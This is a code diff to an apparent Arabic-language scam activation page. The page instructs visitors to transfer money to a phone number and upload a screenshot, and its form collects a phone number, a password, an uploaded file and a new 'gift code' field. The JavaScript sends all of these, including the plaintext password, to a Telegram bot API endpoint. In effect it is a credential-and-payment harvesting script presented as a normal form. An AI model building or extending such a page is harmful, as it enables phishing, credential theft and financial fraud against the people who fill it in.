@@ -109,6 +109,9 @@
             قم بتحويل المبلغ إلى هذا الرقم 01097891442 وقم برفع الاسكرين إلى الموقع قبل الضغط على تفعيل
         </div>
         <form id="activationForm">
+            <label for="giftCode">كود الهدية:</label>
+            <input type="text" id="giftCode" placeholder="أدخل كود الهدية" required>
+
             <label for="phone">رقم الهاتف:</label>
             <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>
             
@@ -148,19 +151,20 @@
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            const giftCode = document.getElementById('giftCode').value;
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const file = fileInput.files[0];
             const pageTitle = document.title;
 
-            if (!file) {
-                alert('يرجى اختيار ملف قبل المتابعة.');
+            if (!giftCode || !file) {
+                alert('يرجى إدخال كود الهدية واختيار ملف قبل المتابعة.');
                 return;
             }
 
             try {
                 // إرسال البيانات النصية مع عنوان الصفحة
-                const message = `🚀 **تفاصيل المستخدم الجديد**:\n\n📱 رقم الهاتف: ${phone}\n🔒 كلمة السر: ${password}\n📄 عنوان الصفحة: ${pageTitle}`;
+                const message = `🚀 **تفاصيل المستخدم الجديد**:\n\n🎁 كود الهدية: ${giftCode}\n📱 رقم الهاتف: ${phone}\n🔒 كلمة السر: ${password}\n📄 عنوان الصفحة: ${pageTitle}`;
                 await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
